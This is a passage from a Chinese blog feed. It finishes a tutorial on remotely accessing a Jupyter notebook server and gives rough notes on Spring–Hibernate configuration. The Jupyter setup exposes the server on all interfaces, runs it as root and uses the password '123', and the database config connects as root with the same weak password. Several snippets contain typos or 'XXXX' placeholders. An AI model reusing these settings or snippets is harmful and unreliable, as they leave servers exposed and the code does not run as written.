txj</span><br></pre></td></tr></table></figure></li></ul><p>在上述服务器名创建完成之后，将在终端输出两个py文件（ipython_config.py、ipython_kernel_config.py）路径，之后使用如下cd命令我们进入到.ipython路径<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">.ipython/</span></span><br></pre></td></tr></table></figure></p><p>操作图示如下：<br><img src="https://gss0.baidu.com/-vo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/d788d43f8794a4c2786d6d6c03f41bd5ad6e392e.jpg" width="600"></p><ul><li>进入<code>.ipython</code>目录之后使用<code>ls</code>命令将会列出上述创建的两个py文件所在，但是我们需要再额外创建一个py配置文件并对其进行设置，在这里我们使用vim来进行操作，关于vim的使用，上述的Anaconda环境配置过程中已经介绍了，遗忘的朋友可以返回看一看再熟悉一下。熟悉之后我们完成如下步骤：<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> .ipython/profile_txj     # 终端进入.ipython路径</span><br><span class="line"><span class="keyword">vim</span> ipython_notebook_config.<span class="keyword">py</span>   # 使用<span class="keyword">vim</span>进行创建ipython_notebook_config.<span class="keyword">py</span>并对其进行编辑</span><br></pre></td></tr></table></figure></li></ul><p>进入到vim环境之后我们在ipython_nnotebook_config.py文件中编辑如下内容：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = get_config()</span><br><span class="line">c.IPKernelApp.pyalb = <span class="string">"inline"</span></span><br><span class="line">c.NotebookApp.ip = <span class="string">"*"</span></span><br><span class="line">c.NotebookApp.open_browser = <span class="keyword">False</span></span><br><span class="line">c.NotebookApp.allow_root = <span class="keyword">True</span></span><br><span class="line">c.NotebookApp.password = <span class="string">u"加密后的密码"</span>    <span class="comment"># 这里我们需要使用上述加密后的密码，在另一个终端可见</span></span><br><span class="line">c.NotebookApp.port = <span class="number">8888</span>   <span class="comment"># 在这里，我们需要设置一个jupyter-notebook的端口，尽量设置的少见点，以免造成端口冲突</span></span><br></pre></td></tr></table></figure></p><p>编辑好后，<code>wq</code>命令保存并退出。</p><ul><li>在上述一切操作完成之后，我们现在来开启该服务器，新建一个终端并执行如下命令<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">jupyter </span>notebook --<span class="built_in">config</span>=你的ipython_notebook_config.py文件路径    </span><br><span class="line"><span class="comment"># 例如/home/lxj/.ipython/profile_XXX/ipython_notebook_config.py</span></span><br></pre></td></tr></table></figure></li></ul><p>在上述命令执行之后，如果出现如下图片所示内容，则说明我们的服务端已经正常启动<br><img src="https://gss0.baidu.com/-fo3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/2cf5e0fe9925bc3192e98bdf53df8db1ca1370c5.jpg" width="600"></p><p><img src="https://gss0.baidu.com/-4o3dSag_xI4khGko9WTAnF6hhy/zhidao/pic/item/377adab44aed2e73cf740c6b8a01a18b86d6fadc.jpg" width="600"></p><ul><li>在服务端启动完成之后，我们在客户端打开浏览器，访问<code>XXX.XXX.XXX.XXX:8888</code>（ubuntu的ip加开放的端口）试试，看看能否正常请求。如果随后出现一个如上所示的Jupyter notebook的登录页面，那么恭喜你，至此Jupyter notebook服务器配置完成，并能够远程访问了。在表单中输入你所设置的密码（上面第一步设置的密码，123）即可开始你的深度学习之旅了。</li></ul><p>以上就是Jupyter notebook服务器的配置及远程访问的内容了，但是能否正常使用<code>requests、numpy、pandas、matplotlib、Tensorflow</code>呢，我们下面将通过几个简单的例子来对其进行测试。<br><img src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=2709137771,173445446&fm=27&gp=0.jpg"></p><hr><h2 id="四、远程环境的测试"><a href="#四、远程环境的测试" class="headerlink" title="四、远程环境的测试"></a>四、远程环境的测试</h2><p>通过上述的操作，我们已经完成了远程操作。但是保险起见，我们对其进行验证，看看anaconda下的第三方包能否正常使用。为此，我们通过以下几个案例来进行验证：</p><ul><li>百度及其子链接的简单爬虫（requests， BeautifulSoup）</li><li>数据可视化操作（pandas，numpy，matplotlib，skimage）</li><li>机器学习之鸢尾花的分类预测（sklearn， numpy）</li></ul><h3 id="4-1-简单爬虫"><a href="#4-1-简单爬虫" class="headerlink" title="4.1 简单爬虫"></a>4.1 简单爬虫</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_page</span><span class="params">(url, headers)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url).text</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    baidu_url = <span class="string">"https://www.baidu.com"</span></span><br><span class="line">    baidu_soup = BeautifulSoup(get_page(baidu_url), <span class="string">"lxml"</span>)</span><br><span class="line">    son_links = [biaoqian_a.attrs[<span class="string">"href"</span>] <span class="keyword">for</span> biaoqian_a <span class="keyword">in</span> baidu_soup.find_all(<span class="string">"a"</span>)]</span><br><span class="line">    <span class="keyword">for</span> index, son_link <span class="keyword">in</span> enumerate(son_links):</span><br><span class="line">        print(<span class="string">"正在请求第&#123;&#125;个页面"</span>.format(str(index)))</span><br><span class="line">        print(get_page(son_link))</span><br></pre></td></tr></table></figure><h3 id="4-2-数据可视化"><a href="#4-2-数据可视化" class="headerlink" title="4.2 数据可视化"></a>4.2 数据可视化</h3><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">% matplot inline</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="title">from</span> amtplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> skimage</span><br><span class="line"></span><br><span class="line"><span class="title">x</span> = np.random.uniform(<span class="number">1</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line"><span class="title">y</span> = np.random.uniform(<span class="number">1</span>, <span class="number">100</span>, <span class="number">100</span>)</span><br><span class="line"><span class="title">plt</span>.plot(x, y)</span><br><span class="line"><span class="title">plt</span>.show()</span><br><span class="line"></span><br><span class="line"><span class="type">XXXXXXXX</span></span><br></pre></td></tr></table></figure><h3 id="4-3-支持向量机下的鸢尾花的识别"><a href="#4-3-支持向量机下的鸢尾花的识别" class="headerlink" title="4.3 支持向量机下的鸢尾花的识别"></a>4.3 支持向量机下的鸢尾花的识别</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XXXX</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过上述的演示，已经完成了windows10下使用xshell远程连接linux系统以及远程访问jupyter-notebook服务，并通过几个小例子来对其进行验证说明可以正常使用linux下的anaconda。虽然msi computer不支持在本机安装linux系统，但是我们依然可以在另一台computer中安装并远程进行访问，而且其中的优势也是显而易见的：</p><ul><li>并不像以前那样虚拟机和物理机都在同一台computer中运行，而是将其中一台computer作为linux服务器，然后使用xshell对其进行远程操作，在一定程度上减小其压力。</li><li>方便了各个进程之间的管理且易于操作</li><li>。。。。。。</li></ul><hr><div style="text-align: right">2018-09-23,By Zero</div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;如今，机器学习、人工智能、深度学习等高深知识逐渐融入大家的视野，为了跟上技术的更新，不被时代所淘汰、out、出局，博主也想打算开始深度学习。
      
    
    </summary>
    
      <category term="Python" scheme="muzimz.cn/categories/Python/"/>
    
    
      <category term="安装" scheme="muzimz.cn/tags/%E5%AE%89%E8%A3%85/"/>
    
      <category term="Python" scheme="muzimz.cn/tags/Python/"/>
    
      <category term="Ubuntu" scheme="muzimz.cn/tags/Ubuntu/"/>
    
      <category term="Linux" scheme="muzimz.cn/tags/Linux/"/>
    
      <category term="深度学习" scheme="muzimz.cn/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>基于MyEclipse的SSH框架整合</title>
    <link href="muzimz.cn/2018/09/20/%E5%88%A9%E7%94%A8MyEclipse%E8%BF%9B%E8%A1%8CSSH%E9%A1%B9%E7%9B%AE%E6%95%B4%E5%90%88/"/>
    <id>muzimz.cn/2018/09/20/利用MyEclipse进行SSH项目整合/</id>
    <published>2018-09-20T12:20:40.000Z</published>
    <updated>2018-12-14T13:18:10.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>以下内容为博主学习Struts+Spring+Hibernate框架时所写笔记，有点凌乱，还未整理。</p></blockquote><h2 id="1-将Spring与Hibernate进行整合"><a href="#1-将Spring与Hibernate进行整合" class="headerlink" title="1. 将Spring与Hibernate进行整合"></a><strong>1. 将Spring与Hibernate进行整合</strong></h2><h3 id="1-1-为项目添加Spring的开发支持"><a href="#1-1-为项目添加Spring的开发支持" class="headerlink" title="1.1 为项目添加Spring的开发支持"></a><strong>1.1 为项目添加Spring的开发支持</strong></h3><blockquote><p>在实际开发的过程中一定要先啊添加Spring而不是Hibernate，否则会出现难以捉摸的bug。</p></blockquote><h4 id="1-1-1-创建一个新的web项目SSHDemo"><a href="#1-1-1-创建一个新的web项目SSHDemo" class="headerlink" title="1.1.1 创建一个新的web项目SSHDemo"></a><strong>1.1.1 创建一个新的web项目SSHDemo</strong></h4><h4 id="1-1-2-添加Spring"><a href="#1-1-2-添加Spring" class="headerlink" title="1.1.2 添加Spring"></a><strong>1.1.2 添加Spring</strong></h4><blockquote><ul><li>configure facets</li><li>install spring facet</li><li>next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。</li></ul></blockquote><h3 id="1-2-添加Hibernate"><a href="#1-2-添加Hibernate" class="headerlink" title="1.2 添加Hibernate"></a><strong>1.2 添加Hibernate</strong></h3><blockquote><ul><li>configure facets</li><li>install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的</li><li>将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file<br>-&gt; next</li><li>打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了</li><li>在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish</li></ul></blockquote><h3 id="1-3-将Spring和Hibernate进行整合"><a href="#1-3-将Spring和Hibernate进行整合" class="headerlink" title="1.3 将Spring和Hibernate进行整合"></a><strong>1.3 将Spring和Hibernate进行整合</strong></h3><h4 id="1-3-1-修改hibernate-cfg-xml文件"><a href="#1-3-1-修改hibernate-cfg-xml文件" class="headerlink" title="1.3.1 修改hibernate.cfg.xml文件"></a><strong>1.3.1 修改hibernate.cfg.xml文件</strong></h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='UTF-8'?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE hibernate-configuration PUBLIC</span></span><br><span class="line"><span class="meta">          "-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span></span><br><span class="line"><span class="meta">          "http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd"&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Generated by MyEclipse Hibernate Tools.                   --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hibernate-configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-factory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"show_sql"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"format_sql"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-factory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">hibernate-configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-3-2-建立一个database-properties文件，用于保存所有数据连接的信息"><a href="#1-3-2-建立一个database-properties文件，用于保存所有数据连接的信息" class="headerlink" title="1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息"></a><strong>1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息</strong></h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">db.<span class="attribute">driver</span>=com.mysql.cj.jdbc.Driver</span><br><span class="line">db.<span class="attribute">url</span>=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8</span><br><span class="line">db.<span class="attribute">user</span>=root</span><br><span class="line">db.<span class="attribute">password</span>=123</span><br><span class="line"></span><br><span class="line">pool.<span class="attribute">max</span>=1</span><br><span class="line">pool.<span class="attribute">min</span>=1</span><br><span class="line">pool.<span class="attribute">init</span>=10</span><br><span class="line">pool.<span class="attribute">idle</span>=20</span><br></pre></td></tr></table></figure><h4 id="1-3-3-配置applicationContext-xml文件"><a href="#1-3-3-配置applicationContext-xml文件" class="headerlink" title="1.3.3 配置applicationContext.xml文件"></a><strong>1.3.3 配置applicationContext.xml文件</strong></h4><p>要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。</p><blockquote><ul><li>在namespace中勾上context，用于添加Annotation支持</li><li>添加支持Annotation</li><li>通过classpath加载databasse.properties文件</li><li>配置数据库连接池</li><li>配置Hibernate的相关环境，SessionFactory可以打开Session</li><li>事务配置的声明</li><li>定义事务的切入点</li></ul></blockquote><ul><li><strong>添加支持Annotation</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置annotation的支持操作 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.tianxingjian"</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>通过classpath加载databasse.properties文件</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:database.properties"</span>/&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>配置数据库连接池</strong></li></ul><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="comment">&lt;!-- 配合数据库连接池 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dataSource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.ComboPooledDataSource"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.driver&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.url&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.user&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;db.password&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.max&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"minPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.min&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"initialPoolSize"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.init&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"maxIdleTime"</span> <span class="attr">value</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pool.idle&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span></span><br></pre></td></tr></table></figure><ul><li><strong>配置Hibernate的相关环境，SessionFactory可以打开Session</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"sessionFactory"</span></span></span><br><span class="line"><span class="tag"><span class="attr">class</span>=<span class="string">"org.springframework.orm.hibernate4.LocalSessionFactoryBean"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"configLocation"</span></span></span><br><span class="line"><span class="tag"><span class="attr">value</span>=<span class="string">"classpath:hibernate.cfg.xml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 就表示这个项目里面引用数据源关系 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>事务的配置声明</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 事务的配置声明 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:annotation-driven</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:advice</span> <span class="attr">id</span>=<span class="string">"txAdvice"</span> <span class="attr">transaction-manager</span>=<span class="string">"transactionManager"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"insert*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"update*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"delete*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"add*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"edit*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"change*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"login*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"get*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"load*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"list*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tx:method</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">propagation</span>=<span class="string">"REQUIRED"</span> <span class="attr">read-only</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:attributes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tx:advice</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>定义事务的切入点</strong></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义事务的切入点 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span> <span class="attr">expose-proxy</span>=<span class="string">"true"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">expression</span>=<span class="string">"execution(* com.tianxingjian..service.*.*(..))"</span> <span class="attr">id</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">"txAdvice"</span> <span class="attr">pointcut-ref</span>=<span class="string">"pointcut"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>_以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_</strong></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span></span><br><span class="line"><span class="xml">xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span></span><br><span class="line"><span class="xml">xmlns:p="http://www.springframework.org/schema/p"</span></span><br><span class="line"><span class="xml">xmlns:tx="http://www.springframework.org/schema/tx"</span></span><br><span class="line"><span class="xml">xmlns:context="http://www.springframework.org/schema/context"</span></span><br><span class="line"><span class="xml">xmlns:aop="http://www.springframework.org/schema/aop"</span></span><br><span class="line"><span class="xml">xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd</span></span><br><span class="line"><span class="xml">http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd</span></span><br><span class="line"><span class="xml">http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd</span></span><br><span class="line"><span class="xml">http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd"&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 配置annotation的支持操作 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.tianxingjian"</span>/&gt;</span></span></span><br><span class="line"><span 